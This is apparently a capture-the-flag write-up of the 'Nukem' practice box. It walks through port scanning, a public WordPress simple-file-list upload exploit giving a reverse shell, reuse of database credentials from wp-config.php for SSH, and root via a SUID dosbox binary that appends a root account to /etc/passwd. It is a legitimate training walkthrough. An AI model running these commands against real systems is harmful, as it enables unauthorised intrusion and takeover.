



# PG Play: [Nukem](https://portal.offensive-security.com/labs/play)

![image](https://user-images.githubusercontent.com/87611022/180659095-75dc4574-0a14-4866-8756-cae67ee8616a.png)

**Nukem** is said to be one of Proving grounds OSCP like boxes so I thought I would give it a try, so here is the writeup...

We begin by port scanning the target machine:

```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/nukem]
└─# cat 192.168.192.105/192.168.192.105.nmap 
# Nmap 7.92 scan initiated Sun Sep  4 16:27:20 2022 as: nmap -p22,80,3306,5000,13000,36445 -sV -sC -T4 -Pn -oA 192.168.192.105 192.168.192.105
Nmap scan report for 192.168.192.105
Host is up (0.094s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-generator: WordPress 5.5.1
3306/tcp  open  mysql?
| fingerprint-strings: 
|   JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, NCP, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServer, ms-sql-s: 
|_    Host '192.168.49.192' is not allowed to connect to this MariaDB server
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
|_http-title: 404 Not Found
13000/tcp open  http        nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
36445/tcp open  netbios-ssn Samba smbd 4.6.2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=9/4%Time=63150A29%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4
SF:D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq
SF:,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionR
SF:eq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LANDesk-RC,4
SF:D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServe
SF:r,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4D,"I\
SF:0\0\x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4D,"I\0\0\
SF:x01\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(ms-sql-s,4D,"I\0\0\x01
SF:\xffj\x04Host\x20'192\.168\.49\.192'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  4 16:28:24 2022 -- 1 IP address (1 host up) scanned in 64.45 seconds

```
Port 80(http):

![image](https://user-images.githubusercontent.com/87611022/188484657-96a1b600-9306-4df6-8909-e2b1c2093387.png)

we can see that this port is hosting a wordpress website so we scan it using [wpscan](https://wpscan.com/wordpress-security-scanner):

```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/nukem]
└─# wpscan --url http://192.168.192.105 --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
```

wordpress provided so much information but the output which proved most interesting is **simple-file-list** plugin because it has an arbitrary file upload [exploit](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiI4oW0gv75AhWpQ_EDHeB1AkUQFnoECAUQAQ&url=https%3A%2F%2Fwww.exploit-db.com%2Fexploits%2F48979&usg=AOvVaw3XRhQqiUOQ1T_E0MhgCORN)
```
[i] Plugin(s) Identified:

[+] simple-file-list
 | Location: http://192.168.192.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2022-08-26T15:08:00.000Z
 | [!] The version is out of date, the latest version is 4.4.12
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.192.105/wp-content/plugins/simple-file-list/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.192.105/wp-content/plugins/simple-file-list/readme.txt


```

we download the exploit and edit our IP/PORT and we start a netcat listener so we can get a reverse shell.

```
┌──(root💀kali)-[/]
└─# python3 48979.py http://192.168.192.105
[ ] File 8979.png generated with password: ec530ef57844e40093d53e9f73b38661
[ ] File uploaded at http://192.168.192.105/wp-content/uploads/simple-file-list/8979.png
[ ] File moved to http://192.168.192.105/wp-content/uploads/simple-file-list/8979.php
[+] Exploit seem to work.
[*] Confirmning
```
```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/nukem]
└─# nc -nlvp 80                                                                              1 ⨯
listening on [any] 80 ...
connect to [192.168.49.192] from (UNKNOWN) [192.168.192.105] 34950
bash: cannot set terminal process group (350): Inappropriate ioctl for device
bash: no job control in this shell
[http@nukem simple-file-list]$
```

in the **http** directory we find an interesting file: **wp-config.php** which has the user **commander** credentials

```
[http@nukem http]$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
.
.
.
/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
```

so we ssh as commander using the credentials we found
```
┌──(root💀kali)-[/]
└─# ssh commander@192.168.192.105                                   130 ⨯
commander@192.168.192.105's password: 
Last login: Mon Sep  5 15:24:58 2022 from 192.168.49.192
[commander@nukem ~]$
```
now to find a possible privilege escalation I personally use [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 
I ran the script and found an interesting Suid binary: **dosbox**
![image](https://user-images.githubusercontent.com/87611022/188486795-77ba4625-7ba1-4f22-bed6-a034d4776c40.png)

now according to [GTFObins](https://gtfobins.github.io/gtfobins/dosbox/#suid) we can use **dosbox** to overwrite any file.

![image](https://user-images.githubusercontent.com/87611022/188487247-fe8bf2db-52a6-408e-a255-e44e21712a3e.png)

The method I thought of was to create a user with root privileges and append it to passwd file so here is how i did it:

first we create the password on our attacking machine using __openssl__

```
┌──(root💀kali)-[~]
└─# openssl passwd -1 -salt user3 pass123  
$1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

then echo our user along with the password hash and add root privileges:
==dont forget to skip the dollar signs==

```
[commander@nukem root]$ /usr/bin/dosbox -c 'mount c /' -c "echo shawarma:\$1\$user3\$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash >>c:$LFILE" -c exit

[commander@nukem root]$ cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
mysql:x:977:977:MariaDB:/var/lib/mysql:/usr/bin/nologin
commander:x:1000:1000::/home/commander:/bin/bash
avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
colord:x:975:975:Color management daemon:/var/lib/colord:/usr/bin/nologin
lightdm:x:974:974:Light Display Manager:/var/lib/lightdm:/usr/bin/nologin
polkitd:x:102:102:PolicyKit daemon:/:/usr/bin/nologin
usbmux:x:140:140:usbmux user:/:/usr/bin/nologin
git:x:973:973:git daemon user:/:/usr/bin/git-shell
shawarma:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash
```
then we __su__ to our new user and get that proof.txt

```
[commander@nukem root]$ su shawarma
Password: 
Warning: your password will expire in 32713 days.
sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```

that's it for this box it was a bit challenging and fun, thank you for reading through this writeup :)
